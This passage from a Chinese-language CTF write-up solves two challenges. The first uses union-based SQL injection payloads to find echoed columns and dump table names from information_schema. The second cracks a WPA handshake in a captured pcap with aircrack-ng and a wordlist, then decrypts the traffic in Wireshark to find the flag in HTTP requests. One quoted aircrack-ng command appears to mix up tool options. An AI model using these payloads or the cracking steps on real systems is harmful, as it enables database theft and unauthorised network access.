然后就是一套sql注入的操作了。确定有回显的位数：payload:-1 union select 1,2,3,4#hxb2018


确定了第二位第三位可以回显，然后爆表：payload:-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),database(),4#hxb2018

Flow

之前做过一次无限wifi破解的流量分析题目，用到的工具是aircrack-ng，但是这个题相比之前那个来说有点坑。首先wireshark打开流量包，看到TP-LinkT协议，先用aircrack-ng分析一下

得到SSID，然后wireshark过滤，过滤语句为wlan.fc.type_subtype== 0x0008&&wlan.ssid==ctf，没有得到什么有用的信息。本来以为可以得到密码的信息之类的。再过滤一下握手包看一下

这里能看到的是wifi连接最底层的信息，由于是wpa，所以使用字典爆破一下。之前做题的时候用的字典在这个题上失效了，没跑出来。又找了几个字典爆破，还是没爆出来。其中一个已经有一百万个数据了，刚开始已经要放弃了，最后找了一个40M的txt字典在后台跑着，没想到跑出来了。

然后就是aircrack-ng命令解密，但是这个文件用平常的aircrack-ng -p password1 -e ctf ctf.pcap搞不出来。

只能在官网求psk然后导入

Wireshark导入协议，输入psk之后。尝试过滤一下http.request.method==GET，发现flag
